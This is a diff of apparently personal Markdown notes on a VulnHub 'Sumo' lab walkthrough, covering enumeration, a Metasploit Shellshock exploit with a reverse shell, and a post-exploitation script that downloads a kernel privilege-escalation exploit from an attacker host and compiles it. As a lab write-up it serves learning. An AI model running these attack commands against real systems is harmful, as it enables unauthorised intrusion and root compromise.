@@ -21,7 +21,9 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
     - I wasn'table to figure out a way to identify these files without Nikto, or what method Nikto used to find them, but it may be related to mod_negotiate being in use on the Apache server
 - Gobuster ( #Crawling )
   - Didn't get 200s for pages other than index.html with Seclists Discovery Wordlists
-  - After having success with Nikto, wrote a script at  [Reconnaissance](Reconnaissance.md) which was able to identify this folder, as well as a default "it works! file". From here there seem to be 2 ways to find the vector:
+  - After having success with Nikto, wrote a script at  [Reconnaissance](Reconnaissance.md) which was able to identify this folder, as well as a default "it works! file". 
+  
+  Nothing else was identified. It's clear this is supposed to be considered enough to find the vector.
     1) Nikto
     2) Knowing that CGI is extremely vulnerable
 No other write-ups I've found have illustrated using pure deduction to figure this vector out.
@@ -33,19 +35,17 @@ Scanned for shellshock vulnerabilities in MSF (Searchsploit could've been used h
 search shellshock
 ```
 
-The ```apache_mod_cgi_bash_env_exec``` exploit was returned as an available msf module.
+The ```apache_mod_cgi_bash_env_exec``` exploit was returned as an applicable msf module.
 
 ###### Metasploit Resource Script for exploitation
 ```
-sudo msfconsole
-use exploit/multi/http/apache_mod_cgi_bash_env_exec
-set PAYLOAD payload/generic/shell_reverse_tcp
-set TARGETURI /cgi-bin/test/test.cgi
-set RHOST 172.16.2.44
-set LPORT 4444
-set CVE CVE-2014-6278
-exploit
-sessions -i 1 -s /home/kali/targetz/sumo/sumo_post.sh
+msfconsole -x "use exploit/multi/http/apache_mod_cgi_bash_env_exec;\
+set PAYLOAD payload/linux/x86/shell_reverse_tcp;\
+set TARGETURI /cgi-bin/test/test.cgi;\
+set RHOST 172.16.2.44;\
+set LPORT 4444;\
+set CVE CVE-2014-6278;\
+exploit -z" 
 ```
 #MetasploitScripts
 
@@ -62,17 +62,23 @@ sessions -i 1 -s /home/kali/targetz/sumo/sumo_post.sh
 --------
 Simply looking up the kernel version in SearchSploit uncovered kernel exploit based LPE
 ```text 
-searchsploit ubuntu 3.2.0 
+searchsploit ubuntu |grep 3.2.0-23 |grep -vi \< 3.2.0-23 
 ```
+In the MSF shell, the following code will trigger the exploit
 
 
 ### sumo_post.sh - privilege escalation script
+
+```
+sessions -i 1 -s /home/kali/targetz/sumo/sumo_post.sh"
+```
 ```bash
-# sumo_post.sh 
-# move here for dirty work
+#!/bin/bash
+#sumo_post.sh 
+# move to tmp for dirty work
 cd /tmp
 R="172.16.2.45"
-wget $R/pwn.c
+wget $R/pwn.c #priv esc exploit
 chmod +x pwn.c
 # fix path, gcc can't see ld binary from tmp 
 export PATH=$PATH:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin
@@ -85,21 +91,20 @@ python -c 'import pty; pty.spawn("/bin/sh")'
 
 ## Appendix: 
 ---
-## Key lessons learned:
----
+### Key lessons learned:
 - Looking only for 200s in gobuster caused me to miss CGI-Bin dir. 
 - Not enabling recursion in your automations can make enumeration a pain
 - Large desire to read approaches that didn't use Nikto to discover the mod-cgi vulnerability
 -Modify shell path early on to avoid "missing" binaries with ```export PATH=$PATH:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin```
-
-## Technical Issues Encountered
 ---
-Encountered 
+### Technical Issues Encountered:
+GCC compliation error:
+ 
 ``` 
 collect2: cannot find 'ld' when compiling in /tmp/
 ```
 
-Solution at  [stackoverflow](https://stackoverflow.com/questions/35970824/gcc-collect2-fatal-error-cannot-find-ld)
+Found solution at  [stackoverflow](https://stackoverflow.com/questions/35970824/gcc-collect2-fatal-error-cannot-find-ld):
 
 Two Options:
 1) modify path
@@ -107,5 +112,7 @@ eg. export PATH=$PATH:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sb
 
  2) copy ld binary to tmp
 
-Tags
+
+Obsidian Tags
+
 #vulnhub #linux
